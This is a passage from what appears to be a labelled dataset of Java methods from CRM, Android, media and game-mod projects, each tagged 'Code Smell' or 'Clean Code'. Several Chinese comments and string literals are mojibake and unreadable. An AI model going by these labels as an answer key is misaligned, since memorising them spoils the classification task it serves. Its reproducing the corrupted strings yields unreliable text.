 * @param rowList 琛屾暟鎹�
 * @author zhangzhiwei
 */
protected void queryExcelHead(List<Object> rowList){
switch (getUploadExcelBO().getCrmEnum()) {
case LEADS:
{
      fieldList=ApplicationContextHolder.getBean(ICrmLeadsService.class).queryField(null);
      break;
    }
case CUSTOMER:
{
    fieldList=ApplicationContextHolder.getBean(ICrmCustomerService.class).queryField(null);
    break;
  }
case CONTACTS:
{
  fieldList=ApplicationContextHolder.getBean(ICrmContactsService.class).queryField(null);
  break;
}
case PRODUCT:
{
fieldList=ApplicationContextHolder.getBean(ICrmProductService.class).queryField(null);
break;
}
}
fieldList.removeIf(record -> ExcelParseUtil.removeFieldByType(record.getType()));
HashMap<String,String> nameMap=new HashMap<>();
HashMap<String,Integer> isNullMap=new HashMap<>();
fieldList.forEach(filed -> {
if (Objects.equals(1,filed.getFieldType()) && !""mapAddress"".equals(filed.getFieldName())) {
fixedFieldList.add(filed);
}
if (Objects.equals(1,filed.getIsUnique())) {
uniqueList.add(filed);
}
if (getUploadExcelBO().getCrmEnum() == CrmEnum.CUSTOMER && ""mapAddress"".equals(filed.getFieldName())) {
nameMap.put(""鐪�"",""province"");
nameMap.put(""甯�"",""city"");
nameMap.put(""鍖�"",""site"");
nameMap.put(""璇︾粏鍦板潃"",""detailAddress"");
isNullMap.put(""鐪�"",0);
isNullMap.put(""甯�"",0);
isNullMap.put(""鍖�"",0);
isNullMap.put(""璇︾粏鍦板潃"",0);
}
 else {
boolean isNull=Objects.equals(1,filed.getIsNull());
nameMap.put((isNull ? ""*"" : """") + filed.getName(),filed.getFieldName());
isNullMap.put((isNull ? ""*"" : """") + filed.getName(),filed.getIsNull());
}
}
);
nameMap.put((getUploadExcelBO().getPoolId() != null ? """" : ""*"") + ""璐熻矗浜�"",""ownerUserName"");
List<String> nameList=new ArrayList<>(nameMap.keySet());
if (nameList.size() != rowList.size() || !nameList.containsAll(rowList)) {
templateErr=true;
}
 else {
for (int i=0; i < rowList.size(); i++) {
kv.put(nameMap.get(rowList.get(i).toString()),i);
if (Objects.equals(1,isNullMap.get(rowList.get(i).toString()))) {
isNullList.add(i);
}
}
}
rowList.add(0,""閿欒鍘熷洜"");
errorList.add(rowList);
}",1,Code Smell
"@DataSource(name=DSEnum.SECONDE_DATA_SOURCE) public void checkIfNeedDeleteTable(MdqTableBO mdqTableBO){
  String database=mdqTableBO.getTableBaseInfo().getBase().getDatabase();
  String tableName=mdqTableBO.getTableBaseInfo().getBase().getName();
  MdqTable oldTable=mdqDao.selectTableForUpdate(database,tableName);
  boolean isPartitionsTabble=mdqTableBO.getTableBaseInfo().getBase().getPartitionTable();
  boolean isImport=mdqTableBO.getImportInfo() != null;
  Integer importType=null;
  if (isImport) {
    importType=mdqTableBO.getImportInfo().getImportType();
  }
  logger.info(""库名:"" + database + ""表名:""+ tableName+ ""是否是分区:""+ isPartitionsTabble+ ""是否是导入创建:""+ isImport+ ""导入类型:""+ importType);
  if (oldTable != null) {
    if (isImport && (importType == MdqImportType.Csv.ordinal() || importType == MdqImportType.Excel.ordinal())) {
      String destination=mdqTableBO.getImportInfo().getArgs().get(""destination"");
      HashMap hashMap=new Gson().fromJson(destination,HashMap.class);
      if (Boolean.valueOf(hashMap.get(""importData"").toString())) {
        logger.info(""Simply add a partition column without dropping the original table(只是单纯增加分区列，不删除掉原来的表)"");
        return;
      }
    }
    logger.info(""This will overwrite the tables originally created through the wizard(将覆盖掉原来通过向导建立的表):"" + oldTable);
    mdqDao.deleteTableBaseInfo(oldTable.getId());
  }
}
",1,Code Smell
"/** 
 * Upgrades the cache file if it is created by an earlier version of  {@link SimpleCache}.
 * @param file The cache file.
 * @param index Cached content index.
 * @return Upgraded cache file or {@code null} if the file name is not correctly formatted or thefile can not be renamed.
 */
@Nullable private static File upgradeFile(File file,CachedContentIndex index){
  String key;
  String filename=file.getName();
  Matcher matcher=CACHE_FILE_PATTERN_V2.matcher(filename);
  if (matcher.matches()) {
    key=Util.unescapeFileName(matcher.group(1));
    if (key == null) {
      return null;
    }
  }
 else {
    matcher=CACHE_FILE_PATTERN_V1.matcher(filename);
    if (!matcher.matches()) {
      return null;
    }
    key=matcher.group(1);
  }
  File newCacheFile=getCacheFile(file.getParentFile(),index.assignIdForKey(key),Long.parseLong(matcher.group(2)),Long.parseLong(matcher.group(3)));
  if (!file.renameTo(newCacheFile)) {
    return null;
  }
  return newCacheFile;
}",1,Code Smell
"public static void deleteWordInEditMode(final String word,final String shortcut,final String weight,final Locale locale,final ContentResolver resolver){
  if (TextUtils.isEmpty(shortcut)) {
    if (locale.equals(UserDictionarySettings.emptyLocale)) {
      resolver.delete(UserDictionary.Words.CONTENT_URI,DELETE_SELECTION_WITHOUT_SHORTCUT_AND_WITH_ALL_LOCALES,new String[]{word,weight});
    }
 else {
      resolver.delete(UserDictionary.Words.CONTENT_URI,DELETE_SELECTION_WITHOUT_SHORTCUT_AND_WITH_LOCALE,new String[]{word,weight,locale.toString()});
    }
  }
 else {
    if (locale.equals(UserDictionarySettings.emptyLocale)) {
      resolver.delete(UserDictionary.Words.CONTENT_URI,DELETE_SELECTION_WITH_SHORTCUT_AND_WITH_ALL_LOCALES,new String[]{word,shortcut,weight});
    }
 else {
      resolver.delete(UserDictionary.Words.CONTENT_URI,DELETE_SELECTION_WITH_SHORTCUT_AND_WITH_LOCALE,new String[]{word,shortcut,weight,locale.toString()});
    }
  }
}
",1,Code Smell
"private void updateGroup1(VideoGroup group){
  if (mGridAdapter1 == null) {
    mPendingUpdates1.add(group);
    return;
  }
  int action=group.getAction();
  if (action == VideoGroup.ACTION_REPLACE) {
    clear1();
    clear2();
  }
 else   if (action == VideoGroup.ACTION_REMOVE) {
    mGridAdapter1.remove(group);
    return;
  }
 else   if (action == VideoGroup.ACTION_SYNC) {
    mGridAdapter1.sync(group);
    return;
  }
  if (group.isEmpty()) {
    return;
  }
  freeze1(true);
  mGridAdapter1.add(group);
  freeze1(false);
  restorePosition1();
}",1,Code Smell
"/** 
 * 鏌ヨ鏄惁鏈夋潈闄�
 * @param type 1 浠诲姟 2 璇勮
 * @param id   id
 * @return bool
 */
public boolean isOaAuth(Integer type,Integer id){
  if (id == null) {
    return false;
  }
  Long userId=UserUtil.getUserId();
  if (UserUtil.isAdmin()) {
    return false;
  }
  if (Objects.equals(1,type)) {
    if (UserUtil.getUser().getRoles().contains(getWorkAdminRole())) {
      return false;
    }
    List<Long> childIdList=adminService.queryChildUserId(userId).getData();
    childIdList.add(userId);
    LambdaQueryChainWrapper<WorkTask> chainWrapper=workTaskService.lambdaQuery();
    chainWrapper.eq(WorkTask::getTaskId,id);
    if (childIdList.size() > 0) {
      chainWrapper.and(wrapper -> {
        childIdList.forEach(childId -> {
          wrapper.or(child -> {
            child.like(WorkTask::getOwnerUserId,childId);
            child.or(or -> or.eq(WorkTask::getMainUserId,childId));
          }
);
        }
);
      }
);
    }
 else {
      chainWrapper.like(WorkTask::getOwnerUserId,userId);
      chainWrapper.or(wrapper -> {
        wrapper.eq(WorkTask::getMainUserId,userId);
      }
);
    }
    return chainWrapper.count() == 0;
  }
 else   if (Objects.equals(2,type)) {
    LambdaQueryChainWrapper<WorkTaskComment> chainWrapper=workTaskCommentService.lambdaQuery();
    chainWrapper.eq(WorkTaskComment::getCommentId,id);
    chainWrapper.eq(WorkTaskComment::getUserId,userId);
    return chainWrapper.count() == 0;
  }
 else {
    return false;
  }
}",1,Code Smell
"private boolean isVersionMatch(Xml.Attribute attribute){
  String[] versions=versionMatcher.split("","");
  double dversion=Double.parseDouble(attribute.getValueAsString());
  for (  String splitVersion : versions) {
    boolean checkGreaterThan=false;
    double dversionExpected;
    if (splitVersion.endsWith(""+"")) {
      splitVersion=splitVersion.substring(0,splitVersion.length() - 1);
      checkGreaterThan=true;
    }
    try {
      dversionExpected=Double.parseDouble(splitVersion);
    }
 catch (    NumberFormatException e) {
      return false;
    }
    if (!checkGreaterThan && dversionExpected == dversion || checkGreaterThan && dversionExpected <= dversion) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"private void showFilterData(String key){
  if (mPopupWindow == null || mAdapter == null || mAdapter.getEditSpinnerFilter() == null) {
    dismissDropDown();
    return;
  }
  if (mAdapter.getEditSpinnerFilter().onFilter(key)) {
    showDropDown();
  }
 else {
    dismissDropDown();
  }
}
",1,Code Smell
"public static void removeTransitionListener(Object transition,TransitionListener listener){
  if (Build.VERSION.SDK_INT >= 19) {
    if (listener == null || listener.mImpl == null) {
      return;
    }
    Transition t=(Transition)transition;
    t.removeListener((Transition.TransitionListener)listener.mImpl);
    listener.mImpl=null;
  }
 else {
    TransitionStub stub=(TransitionStub)transition;
    if (stub.mTransitionListeners != null) {
      stub.mTransitionListeners.remove(listener);
    }
  }
}",1,Code Smell
"/** 
 * 更新消息
 */
private String updateMessage(){
  if (isValid() && mTime != 0 && mMessage.contains(TIME_PLACE_HOLDER)) {
    String internal=String.valueOf(calculateNumberOfMinutes(mTime));
    return mMessage.replace(TIME_PLACE_HOLDER,internal);
  }
 else {
    return mMessage;
  }
}",1,Code Smell
"@ExceptionHandler(Exception.class) public Object handleException(Exception e,HttpServletRequest req){
  Result result=new Result();
  result.setResultCode(500);
  if (e instanceof NewBeeMallException) {
    result.setMessage(e.getMessage());
  }
 else {
    e.printStackTrace();
    result.setMessage(""未知异常"");
  }
  String contentTypeHeader=req.getHeader(""Content-Type"");
  String acceptHeader=req.getHeader(""Accept"");
  String xRequestedWith=req.getHeader(""X-Requested-With"");
  if ((contentTypeHeader != null && contentTypeHeader.contains(""application/json"")) || (acceptHeader != null && acceptHeader.contains(""application/json"")) || ""XMLHttpRequest"".equalsIgnoreCase(xRequestedWith)) {
    return result;
  }
 else {
    ModelAndView modelAndView=new ModelAndView();
    modelAndView.addObject(""message"",e.getMessage());
    modelAndView.addObject(""url"",req.getRequestURL());
    modelAndView.addObject(""stackTrace"",e.getStackTrace());
    modelAndView.addObject(""author"",""十三"");
    modelAndView.addObject(""ltd"",""新蜂商城"");
    modelAndView.setViewName(""error/error"");
    return modelAndView;
  }
}",1,Code Smell
"/** 
 * 鎵弿PoC-T涓殑poc鑴氭湰銆侱:\github\POC-T\script
 * @param dir
 * @return
 */
public IndexedLinkedHashMap<String,LineEntry> scanPoCFiles(String dir){
  IndexedLinkedHashMap<String,LineEntry> lineEntries=new IndexedLinkedHashMap<String,LineEntry>();
  if (null == dir || !new File(dir).exists()) {
    return lineEntries;
  }
  Collection<File> files=FileUtils.listFiles(new File(dir),FileFilterUtils.suffixFileFilter("".py""),DirectoryFileFilter.INSTANCE);
  for (  File file : files) {
    if (file.exists() && file.isFile() && !file.getName().startsWith(""__"")) {
      LineEntry entry=PoctParser.Parser(file.toString());
      lineEntries.put(file.toString(),entry);
    }
  }
  return lineEntries;
}
",1,Code Smell
"@Override public DefineClassContext beforeDefineClass(ClassLoader classLoader,String className,byte[] classBytes,int offset,int length){
  if (classBytes == null || (classBytes.length == 40 && new String(classBytes,StandardCharsets.ISO_8859_1).startsWith(""J9ROMCLASSCOOKIE""))) {
    return null;
  }
  Set<String> superNames=new HashSet<>();
  DefineClassContextImpl context=DefineClassContextImpl.enter();
  try {
    ClassReader cr=new ClassReader(classBytes,offset,length);
    String superName=cr.getSuperName();
    if (superName != null) {
      String superDotName=superName.replace('/','.');
      Class<?> clazz=Class.forName(superDotName,false,classLoader);
      addSuperNames(superNames,clazz);
    }
    String[] interfaces=cr.getInterfaces();
    for (    String interfaceName : interfaces) {
      String interfaceDotName=interfaceName.replace('/','.');
      Class<?> clazz=Class.forName(interfaceDotName,false,classLoader);
      addSuperNames(superNames,clazz);
    }
    context.superDotNames=superNames;
  }
 catch (  Throwable throwable) {
    context.failedClassDotName=className;
  }
  return context;
}",1,Code Smell
"@SuppressLint(""NewApi"") private void createShortcut(){
  if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1 && mUseAndroidNShortcut.isChecked()) || Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    createShortcutByShortcutManager();
    return;
  }
  Shortcut shortcut=new Shortcut(this);
  if (mIsDefaultIcon) {
    shortcut.iconRes(R.drawable.ic_node_js_black);
  }
 else {
    Bitmap bitmap=BitmapTool.drawableToBitmap(mIcon.getDrawable());
    shortcut.icon(bitmap);
  }
  shortcut.name(mName.getText().toString()).targetClass(ShortcutActivity.class).extras(new Intent().putExtra(ScriptIntents.EXTRA_KEY_PATH,mScriptFile.getPath())).send();
}",1,Code Smell
"@Override public Keystore getKeystore(List<ChildNumber> derivation,List<String> mnemonicWords,String passphrase) throws ImportException {
  try {
    Bip39MnemonicCode.INSTANCE.check(mnemonicWords);
    DeterministicSeed seed=new DeterministicSeed(mnemonicWords,passphrase,System.currentTimeMillis(),DeterministicSeed.Type.BIP39);
    return Keystore.fromSeed(seed,derivation);
  }
 catch (  Exception e) {
    try {
      ElectrumMnemonicCode.INSTANCE.check(mnemonicWords);
      throw new ImportException(new MnemonicException.MnemonicTypeException(DeterministicSeed.Type.ELECTRUM));
    }
 catch (    Exception ex) {
      if (ex instanceof ImportException && ex.getCause() instanceof MnemonicException.MnemonicTypeException) {
        throw (ImportException)ex;
      }
    }
    throw new ImportException(e);
  }
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public boolean isCompatible(DalvInsn insn){
  RegisterSpecList regs=insn.getRegisters();
  if (!((insn instanceof TargetInsn) && (regs.size() == 2) && unsignedFitsInNibble(regs.get(0).getReg())&& unsignedFitsInNibble(regs.get(1).getReg()))) {
    return false;
  }
  TargetInsn ti=(TargetInsn)insn;
  return !ti.hasTargetOffset() || branchFits(ti);
}",1,Code Smell
"/** 
 * @see com.google.android.exoplayer2.extractor.Extractor#sniff(ExtractorInput)
 */
public boolean sniff(ExtractorInput input) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)(inputLength == C.LENGTH_UNSET || inputLength > SEARCH_LENGTH ? SEARCH_LENGTH : inputLength);
  input.peekFully(scratch.data,0,4);
  long tag=scratch.readUnsignedInt();
  peekLength=4;
  while (tag != ID_EBML) {
    if (++peekLength == bytesToSearch) {
      return false;
    }
    input.peekFully(scratch.data,0,1);
    tag=(tag << 8) & 0xFFFFFF00;
    tag|=scratch.data[0] & 0xFF;
  }
  long headerSize=readUint(input);
  long headerStart=peekLength;
  if (headerSize == Long.MIN_VALUE || (inputLength != C.LENGTH_UNSET && headerStart + headerSize >= inputLength)) {
    return false;
  }
  while (peekLength < headerStart + headerSize) {
    long id=readUint(input);
    if (id == Long.MIN_VALUE) {
      return false;
    }
    long size=readUint(input);
    if (size < 0 || size > Integer.MAX_VALUE) {
      return false;
    }
    if (size != 0) {
      int sizeInt=(int)size;
      input.advancePeekPosition(sizeInt);
      peekLength+=sizeInt;
    }
  }
  return peekLength == headerStart + headerSize;
}",1,Code Smell
"protected Fluid search(Fluid fluid,List<BlockPosEntry> frontier,Set<BlockPos> visited,BiConsumer<BlockPos,Integer> add,boolean searchDownward) throws ChunkNotLoadedException {
  Level world=getWorld();
  int maxBlocks=maxBlocks();
  int maxRange=maxRange();
  int maxRangeSq=maxRange * maxRange;
  int i;
  for (i=0; i < searchedPerTick && !frontier.isEmpty() && (visited.size() <= maxBlocks || !canDrainInfinitely(fluid)); i++) {
    BlockPosEntry entry=frontier.remove(0);
    BlockPos currentPos=entry.pos;
    if (visited.contains(currentPos))     continue;
    visited.add(currentPos);
    if (!world.isLoaded(currentPos))     throw new ChunkNotLoadedException();
    FluidState fluidState=world.getFluidState(currentPos);
    if (fluidState.isEmpty())     continue;
    Fluid currentFluid=FluidHelper.convertToStill(fluidState.getType());
    if (fluid == null)     fluid=currentFluid;
    if (!currentFluid.isSame(fluid))     continue;
    add.accept(currentPos,entry.distance);
    for (    Direction side : Iterate.directions) {
      if (!searchDownward && side == Direction.DOWN)       continue;
      BlockPos offsetPos=currentPos.relative(side);
      if (!world.isLoaded(offsetPos))       throw new ChunkNotLoadedException();
      if (visited.contains(offsetPos))       continue;
      if (offsetPos.distSqr(rootPos) > maxRangeSq)       continue;
      FluidState nextFluidState=world.getFluidState(offsetPos);
      if (nextFluidState.isEmpty())       continue;
      Fluid nextFluid=nextFluidState.getType();
      if (nextFluid == FluidHelper.convertToFlowing(nextFluid) && side == Direction.UP && !VecHelper.onSameAxis(rootPos,offsetPos,Axis.Y))       continue;
      frontier.add(new BlockPosEntry(offsetPos,entry.distance + 1));
    }
  }
  return fluid;
}",1,Code Smell
"@Override public boolean initOnce(){
  try {
    final Class mEmoAddedAuthCallback=_EmoAddedAuthCallback();
    final Class mFavEmoRoamingHandler=_FavEmoRoamingHandler();
    if (mEmoAddedAuthCallback == null) {
      if (mFavEmoRoamingHandler == null) {
        setEmoNum();
      }
 else {
        XposedHelpers.findAndHookMethod(mFavEmoRoamingHandler,""a"",List.class,List.class,new XC_MethodHook(){
          @Override protected void beforeHookedMethod(          MethodHookParam param) throws Throwable {
            setEmoNum();
          }
        }
);
      }
    }
 else {
      Class mUpCallBack$SendResult=null;
      for (      Method m : mEmoAddedAuthCallback.getDeclaredMethods()) {
        if (m.getName().equals(""b"") && m.getReturnType().equals(void.class) && m.getParameterTypes().length == 1) {
          mUpCallBack$SendResult=m.getParameterTypes()[0];
          break;
        }
      }
      XposedHelpers.findAndHookMethod(mEmoAddedAuthCallback,""b"",mUpCallBack$SendResult,new XC_MethodHook(){
        @Override protected void beforeHookedMethod(        MethodHookParam param) throws Throwable {
          Object msg=param.args[0];
          iput_object(msg,""a"",int.class,0);
        }
      }
);
      XposedHelpers.findAndHookMethod(mFavEmoRoamingHandler,""a"",List.class,List.class,new XC_MethodHook(){
        @Override protected void beforeHookedMethod(        MethodHookParam param) throws Throwable {
          setEmoNum();
        }
      }
);
    }
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",1,Code Smell
"@Override public void onApplicationEvent(ThreadPoolConfigDynamicRefreshEvent event){
  List<AdapterExecutorProperties> adapterExecutors=event.getBootstrapConfigProperties().getAdapterExecutors();
  Map<String,ThreadPoolAdapter> threadPoolAdapterMap=ApplicationContextHolder.getBeansOfType(ThreadPoolAdapter.class);
  if (CollectionUtil.isEmpty(adapterExecutors) || CollectionUtil.isEmpty(threadPoolAdapterMap)) {
    return;
  }
  for (  AdapterExecutorProperties each : adapterExecutors) {
    String buildKey=each.getMark() + IDENTIFY_SLICER_SYMBOL + each.getThreadPoolKey();
    AdapterExecutorProperties adapterExecutorProperties=dynamicThreadPoolAdapterRegister.discoverAdapterExecutorAndGet(buildKey);
    if (adapterExecutorProperties == null || !adapterExecutorProperties.getEnable() || !match(adapterExecutorProperties)) {
      continue;
    }
    threadPoolAdapterMap.forEach((key,val) -> {
      if (Objects.equals(val.mark(),each.getMark())) {
        ThreadPoolAdapterState threadPoolState=val.getThreadPoolState(each.getThreadPoolKey());
        if (!Objects.equals(threadPoolState.getCoreSize(),each.getCorePoolSize()) || !Objects.equals(threadPoolState.getMaximumSize(),each.getMaximumPoolSize())) {
          val.updateThreadPool(BeanUtil.convert(each,ThreadPoolAdapterParameter.class));
          DynamicThreadPoolAdapterRegister.ADAPTER_EXECUTORS_MAP.put(buildKey,each);
        }
      }
    }
);
  }
}
",1,Code Smell
"@ApiOperation(""涓嬭浇鏂囦欢"") @RequestMapping(""/down"") @LoginFromCookie public void down(@RequestParam(""type"") Integer type,@RequestParam(""key"") String key,HttpServletResponse response){
  String object=BaseUtil.getRedis().get(CrmCacheKey.CRM_PRINT_TEMPLATE_CACHE_KEY + key);
  if (StrUtil.isNotEmpty(object)) {
    JSONObject parse=JSON.parseObject(object);
    String path;
    if (type == 2) {
      path=parse.getString(""word"");
    }
 else {
      path=parse.getString(""pdf"");
    }
    if (FileUtil.exist(path)) {
      ServletUtil.write(response,FileUtil.file(path));
      return;
    }
  }
  ServletUtil.write(response,Result.ok().toJSONString(),""text/plain"");
}",1,Code Smell
"protected void captureMultiblock(BlockPos localPos,StructureBlockInfo structureBlockInfo,BlockEntity be){
  if (!(be instanceof IMultiBlockEntityContainer))   return;
  CompoundTag nbt=structureBlockInfo.nbt();
  BlockPos controllerPos=nbt.contains(""Controller"") ? toLocalPos(NbtUtils.readBlockPos(nbt.getCompound(""Controller""))) : localPos;
  nbt.put(""Controller"",NbtUtils.writeBlockPos(controllerPos));
  if (multiBlockBE.isController() && multiBlockBE.getHeight() <= 1 && multiBlockBE.getWidth() <= 1) {
    nbt.put(""LastKnownPos"",NbtUtils.writeBlockPos(BlockPos.ZERO.below(Integer.MAX_VALUE - 1)));
    return;
  }
  nbt.remove(""LastKnownPos"");
  capturedMultiblocks.put(controllerPos,structureBlockInfo);
}",1,Code Smell
"@Override public void onNotifyEvent(String key,String subKey,Map<String,Object> param){
  if (TUIConstants.TUILogin.EVENT_LOGIN_STATE_CHANGED.equals(key)) {
    if (TUIConstants.TUILogin.EVENT_SUB_KEY_USER_LOGOUT_SUCCESS.equals(subKey)) {
      TUICallEngine.createInstance(mContext).hangup(null);
      TUICallEngine.destroyInstance();
      resetCall();
    }
 else     if (TUIConstants.TUILogin.EVENT_SUB_KEY_USER_LOGIN_SUCCESS.equals(subKey)) {
      TUILog.i(TAG,""login success"");
      TUICallEngine.createInstance(mContext).addObserver(mTUICallObserver);
      initCallEngine();
    }
  }
  if (Constants.EVENT_TUICALLING_CHANGED.equals(key) && Constants.EVENT_SUB_CALL_STATUS_CHANGED.equals(subKey) && param != null) {
    if (TUICallDefine.Status.None.equals(param.get(Constants.CALL_STATUS))) {
      resetCall();
    }
  }
}
",1,Code Smell
"public static BiTimeEntity analyzeTypeOa(BiParams biParams){
  BiTimeEntity biTimeEntity=analyzeTime(biParams);
  List<Long> userIdList=new ArrayList<>();
  Integer deptId=biParams.getDeptId();
  Long userId=biParams.getUserId();
  Integer isUser=biParams.getIsUser();
  if (isUser == 0) {
    if (deptId == null) {
      deptId=0;
    }
    AdminService adminService=ApplicationContextHolder.getBean(AdminService.class);
    List<Integer> deptIdList=adminService.queryChildDeptId(deptId).getData();
    deptIdList.add(deptId);
    userIdList=adminService.queryUserByDeptIds(deptIdList).getData();
  }
 else {
    if (userId == null) {
      userIdList=ApplicationContextHolder.getBean(AdminService.class).queryUserList(1).getData();
    }
 else {
      userIdList.add(userId);
    }
  }
  biTimeEntity.setUserIds(userIdList);
  return biTimeEntity;
}",1,Code Smell
"private void setupConferenceInfo(ConferenceInfo info){
  if (isFinishing()) {
    return;
  }
  conferenceInfo=info;
  ConferenceManager.getManager().setCurrentConferenceInfo(info);
  titleTextView.setText(info.getConferenceTitle());
  String owner=info.getOwner();
  String ownerName=ChatManager.Instance().getUserDisplayName(owner);
  ownerTextView.setText(ownerName);
  callIdTextView.setText(info.getConferenceId());
  startDateTimeView.setText(info.getStartTime() == 0 ? ""现在"" : new Date(info.getStartTime() * 1000).toString());
  endDateTimeView.setText(new Date(info.getEndTime() * 1000).toString());
  if (info.isAudience() && !info.isAllowTurnOnMic() && !owner.equals(ChatManager.Instance().getUserId())) {
    audioSwitch.setChecked(false);
    videoSwitch.setChecked(false);
    audioSwitch.setEnabled(false);
    videoSwitch.setEnabled(false);
  }
  long now=System.currentTimeMillis() / 1000;
  if (now > info.getEndTime()) {
    joinConferenceButton.setEnabled(false);
    joinConferenceButton.setText(""会议已结束"");
  }
 else   if (now < info.getStartTime()) {
    joinConferenceButton.setEnabled(false);
    joinConferenceButton.setText(""会议未开始"");
  }
 else {
    joinConferenceButton.setEnabled(true);
    joinConferenceButton.setText(""加入会议"");
  }
  if (destroyItem != null) {
    if (Objects.equals(owner,ChatManager.Instance().getUserId())) {
      destroyItem.setVisible(true);
    }
 else {
      destroyItem.setVisible(false);
    }
  }
}",1,Code Smell
"private void payloadExportResult(final ActivityResult result){
  Log.d(TAG,""payloadExportResult"");
  if ((mRawPayloadToExport == null) && (mStringPayloadToExport == null))   return;
  if ((result.getResultCode() == RESULT_OK) && (result.getData() != null) && (result.getData().getData() != null)) {
    try (OutputStream out=getContentResolver().openOutputStream(result.getData().getData(),""rwt"")){
      if (out != null) {
        if (mStringPayloadToExport != null) {
          try (OutputStreamWriter writer=new OutputStreamWriter(out)){
            writer.write(mStringPayloadToExport);
          }
         }
 else         out.write(mRawPayloadToExport);
        Utils.showToast(this,R.string.save_ok);
      }
 else       Utils.showToastLong(this,R.string.export_failed);
    }
 catch (    IOException e) {
      e.printStackTrace();
      Utils.showToastLong(this,R.string.export_failed);
    }
  }
  mRawPayloadToExport=null;
  mStringPayloadToExport=null;
}
",1,Code Smell
"public TrackMaterial build(){
  assert trackBlock != null;
  assert langName != null;
  assert particle != null;
  assert trackType != null;
  assert sleeperIngredient != null;
  assert railsIngredient != null;
  assert id != null;
  DistExecutor.unsafeRunWhenOn(Dist.CLIENT,() -> () -> {
    assert modelHolder != null;
    if (tieModel != null || leftSegmentModel != null || rightSegmentModel != null) {
      assert tieModel != null && leftSegmentModel != null && rightSegmentModel != null;
      modelHolder=new TrackMaterial.TrackModelHolder(tieModel,leftSegmentModel,rightSegmentModel);
    }
  }
);
  return new TrackMaterial(id,langName,trackBlock,particle,sleeperIngredient,railsIngredient,trackType,() -> () -> modelHolder,customFactory);
}
",0,Clean Code
"@Override public void dump(Dumper dumper){
  dumper.startBlock(""format"").add(""bitrate"",format.bitrate).add(""id"",format.id).add(""containerMimeType"",format.containerMimeType).add(""sampleMimeType"",format.sampleMimeType).add(""maxInputSize"",format.maxInputSize).add(""width"",format.width).add(""height"",format.height).add(""frameRate"",format.frameRate).add(""rotationDegrees"",format.rotationDegrees).add(""pixelWidthHeightRatio"",format.pixelWidthHeightRatio).add(""channelCount"",format.channelCount).add(""sampleRate"",format.sampleRate).add(""pcmEncoding"",format.pcmEncoding).add(""encoderDelay"",format.encoderDelay).add(""encoderPadding"",format.encoderPadding).add(""subsampleOffsetUs"",format.subsampleOffsetUs).add(""selectionFlags"",format.selectionFlags).add(""language"",format.language).add(""drmInitData"",format.drmInitData != null ? format.drmInitData.hashCode() : ""-"");
  dumper.startBlock(""initializationData"");
  for (int i=0; i < format.initializationData.size(); i++) {
    dumper.add(""data"",format.initializationData.get(i));
  }
  dumper.endBlock().endBlock();
  dumper.add(""total output bytes"",sampleData.length);
  dumper.add(""sample count"",sampleTimesUs.size());
  for (int i=0; i < sampleTimesUs.size(); i++) {
    dumper.startBlock(""sample "" + i).add(""time"",sampleTimesUs.get(i)).add(""flags"",sampleFlags.get(i)).add(""data"",getSampleData(i));
    CryptoData cryptoData=cryptoDatas.get(i);
    if (cryptoData != null) {
      dumper.add(""crypto mode"",cryptoData.cryptoMode);
      dumper.add(""encryption key"",cryptoData.encryptionKey);
    }
    dumper.endBlock();
  }
}",0,Clean Code
"@Override public List<CrmActionRecordVO> queryRecordList(Integer actionId,Integer crmTypes){
  List<CrmActionRecordVO> recordList=getBaseMapper().queryRecordList(actionId,crmTypes);
  recordList.forEach(record -> {
    try {
      List<String> list=JSON.parseArray((String)record.getContent(),String.class);
      record.setContent(list);
    }
 catch (    Exception e) {
      List<String> list=new ArrayList<>();
      list.add((String)record.getContent());
      record.setContent(list);
    }
  }
);
  return recordList;
}
",0,Clean Code
"/** 
 * Call  {@link Activity#startActivity(Intent)} from the fragment'scontaining Activity.
 */
public void startActivity(@SuppressLint(""UnknownNullness"") Intent intent){
  startActivity(intent,null);
}
/** 
 * Call  {@link Activity#startActivity(Intent,Bundle)} from the fragment'scontaining Activity.
 */
public void startActivity(@SuppressLint(""UnknownNullness"") Intent intent,@Nullable Bundle options){
  if (mHost == null) {
    throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");
  }
  mHost.onStartActivityFromFragment(this,intent,-1,options);
}",0,Clean Code
"boolean recur(TreeNode L,TreeNode R){
  if (L == null && R == null)   return true;
  if (L == null || R == null || L.val != R.val)   return false;
  return recur(L.left,R.right) && recur(L.right,R.left);
}
",0,Clean Code
"/** 
 * 瀹氭椂杞鎷夊彇Redis涓彉鍖栫殑鏁版嵁
 */
@Override public void listenRedis(){
  String keyLuaOfChain=chainClient.scriptLoad(luaOfKey);
  String valueLuaOfChain=chainClient.scriptLoad(luaOfValue);
  ChainPollingTask chainTask=new ChainPollingTask(redisParserVO,chainClient,chainNum,chainSHAMap,keyLuaOfChain,valueLuaOfChain);
  pollExecutor.scheduleAtFixedRate(chainTask,redisParserVO.getPollingStartTime().longValue(),redisParserVO.getPollingInterval().longValue(),TimeUnit.SECONDS);
  if (ObjectUtil.isNotNull(scriptClient) && ObjectUtil.isNotNull(redisParserVO.getScriptDataBase()) && StrUtil.isNotBlank(redisParserVO.getScriptKey())) {
    String keyLuaOfScript=scriptClient.scriptLoad(luaOfKey);
    String valueLuaOfScript=scriptClient.scriptLoad(luaOfValue);
    ScriptPollingTask scriptTask=new ScriptPollingTask(redisParserVO,scriptClient,scriptNum,scriptSHAMap,keyLuaOfScript,valueLuaOfScript);
    pollExecutor.scheduleAtFixedRate(scriptTask,redisParserVO.getPollingStartTime().longValue(),redisParserVO.getPollingInterval().longValue(),TimeUnit.SECONDS);
  }
}
",0,Clean Code
"/** 
 * 娴佸埌鏉ョ殑澶勭悊
 */
@Async(""taskExecutor"") @org.springframework.context.event.EventListener public void onApplicationEvent(MediaArrivalEvent event){
}
/** 
 * 娴佺寮�鐨勫鐞�
 */
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaDepartureEvent event){
  if (""rtsp"".equals(event.getSchema()) && ""rtp"".equals(event.getApp())) {
    InviteInfo inviteInfo=getInviteInfoByStream(null,event.getStream());
    if (inviteInfo != null && (inviteInfo.getType() == InviteSessionType.PLAY || inviteInfo.getType() == InviteSessionType.PLAYBACK)) {
      removeInviteInfo(inviteInfo);
